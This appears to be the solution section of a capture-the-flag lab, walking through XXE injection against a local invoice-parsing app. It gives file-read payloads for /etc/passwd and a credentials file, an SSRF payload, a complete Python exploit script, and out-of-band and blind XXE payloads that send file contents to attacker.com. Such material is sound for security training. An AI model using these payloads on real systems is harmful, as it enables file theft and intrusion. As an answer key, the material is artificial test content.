## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: FLAG 1 - Basic XXE Detection

#### Step 1: Understand the Invoice Format

Visit http://localhost:4005/example to see the expected XML format:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<invoice>
    <number>INV-2026-001</number>
    <date>2026-01-19</date>
    <customer>Acme Corporation</customer>
    <amount>1500.00</amount>
    <items>
        <item>
            <description>Security Audit</description>
            <price>1000.00</price>
        </item>
    </items>
</invoice>
```

#### Step 2: Test Basic XXE

Create a malicious XML file with an external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe "XXE_INJECTION_WORKS">
]>
<invoice>
    <number>&xxe;</number>
    <date>2026-01-19</date>
    <customer>Test Customer</customer>
    <amount>100.00</amount>
</invoice>
```

Upload this file via the web interface at http://localhost:4005/upload

If you see "XXE_INJECTION_WORKS" in the output, the XXE vulnerability is confirmed!

#### Step 2b: Discover Flag Locations

Before injecting, check `robots.txt` and the API docs for path hints:

```bash
curl http://localhost:4005/robots.txt
```

The `robots.txt` hints at sensitive directories including `/tmp/` and `/opt/eversec/`. You can also check:

```bash
curl http://localhost:4005/api/docs
```

The API docs endpoint also reveals storage path information used by the application.

#### Step 3: Get FLAG 1

FLAG 1 is at `/tmp/flags/flag1.txt`. Read it with XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///tmp/flags/flag1.txt">
]>
<invoice>
    <number>&xxe;</number>
    <date>2026-01-19</date>
    <customer>Attacker</customer>
    <amount>0.00</amount>
</invoice>
```

The flag will appear in the invoice number field!

### Phase 2: FLAG 2 - File Disclosure

FLAG 2 is stored at `/opt/eversec/secrets/credentials.conf` as the value of `db_pass`. Read it to extract the flag:

#### Step 4: Read Arbitrary Files

Read sensitive system files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
    <number>INV-001</number>
    <date>2026-01-19</date>
    <customer>&xxe;</customer>
    <amount>100.00</amount>
</invoice>
```

#### Step 5: Get FLAG 2

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY flag2 SYSTEM "file:///opt/eversec/secrets/credentials.conf">
]>
<invoice>
    <number>INV-002</number>
    <date>2026-01-19</date>
    <customer>&flag2;</customer>
    <amount>200.00</amount>
</invoice>
```

The credentials file contains `db_pass=<flag>`. The flag value is the content after the `=` sign.

#### Step 6: Use API Endpoint (Easier)

```bash
curl -X POST http://localhost:4005/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///tmp/flags/flag2.txt">]>
<invoice>
  <number>001</number>
  <date>2026-01-19</date>
  <customer>&xxe;</customer>
  <amount>100</amount>
</invoice>'
```

### Phase 3: FLAG 3 - SSRF Attack

#### Step 7: Access Internal Services

The application has an internal admin endpoint at `http://localhost:4005/admin/flag`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY ssrf SYSTEM "http://localhost:4005/admin/flag">
]>
<invoice>
    <number>INV-003</number>
    <date>2026-01-19</date>
    <customer>&ssrf;</customer>
    <amount>300.00</amount>
</invoice>
```

The response from the internal endpoint (including FLAG 3) will appear in the customer field!

### Complete Exploit Script

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:4005"

print("=" * 60)
print("XXE Injection Exploit")
print("=" * 60)

# Phase 1: FLAG 1 - Basic XXE
print("\n[Phase 1] Basic XXE - FLAG 1")
print("-" * 60)

xxe_payload_flag1 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY flag1 SYSTEM "file:///tmp/flags/flag1.txt">
]>
<invoice>
  <number>&flag1;</number>
  <date>2026-01-19</date>
  <customer>Attacker</customer>
  <amount>100.00</amount>
</invoice>'''

response = requests.post(
    f"{BASE_URL}/api/parse",
    data=xxe_payload_flag1,
    headers={'Content-Type': 'application/xml'}
)

if response.status_code == 200:
    result = response.json()
    invoice_number = result.get('invoice', {}).get('number', '')
    if 'FLAG{' in invoice_number:
        print(f"🚩 FLAG 1: {invoice_number.strip()}")
    else:
        print(f"[+] Invoice number: {invoice_number}")

# Phase 2: FLAG 2 - File Disclosure
print("\n[Phase 2] File Disclosure - FLAG 2")
print("-" * 60)

xxe_payload_flag2 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY flag2 SYSTEM "file:///tmp/flags/flag2.txt">
]>
<invoice>
  <number>INV-002</number>
  <date>2026-01-19</date>
  <customer>&flag2;</customer>
  <amount>200.00</amount>
</invoice>'''

response = requests.post(
    f"{BASE_URL}/api/parse",
    data=xxe_payload_flag2,
    headers={'Content-Type': 'application/xml'}
)

if response.status_code == 200:
    result = response.json()
    customer = result.get('invoice', {}).get('customer', '')
    if 'FLAG{' in customer:
        print(f"🚩 FLAG 2: {customer.strip()}")
    else:
        print(f"[+] Customer field: {customer}")

# Phase 3: FLAG 3 - SSRF
print("\n[Phase 3] SSRF Attack - FLAG 3")
print("-" * 60)

xxe_payload_flag3 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY ssrf SYSTEM "http://localhost:4005/admin/flag">
]>
<invoice>
  <number>INV-003</number>
  <date>2026-01-19</date>
  <customer>&ssrf;</customer>
  <amount>300.00</amount>
</invoice>'''

response = requests.post(
    f"{BASE_URL}/api/parse",
    data=xxe_payload_flag3,
    headers={'Content-Type': 'application/xml'}
)

if response.status_code == 200:
    result = response.json()
    customer = result.get('invoice', {}).get('customer', '')

    # The response might be JSON stringified
    if 'flag' in customer.lower():
        import re
        flag_match = re.search(r'FLAG\{[^}]+\}', customer)
        if flag_match:
            print(f"🚩 FLAG 3: {flag_match.group(0)}")
        else:
            print(f"[+] SSRF Response: {customer}")

print("\n" + "=" * 60)
```

### Advanced XXE Techniques

#### Out-of-Band (OOB) XXE

When direct output is not available, use OOB exfiltration:

```xml
<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<invoice>
  <number>001</number>
  <date>2026-01-19</date>
  <customer>Test</customer>
  <amount>100</amount>
</invoice>
```

evil.dtd on attacker server:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

#### Blind XXE

When no output is returned:

```xml
<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<invoice>
  <number>001</number>
</invoice>
```

</details>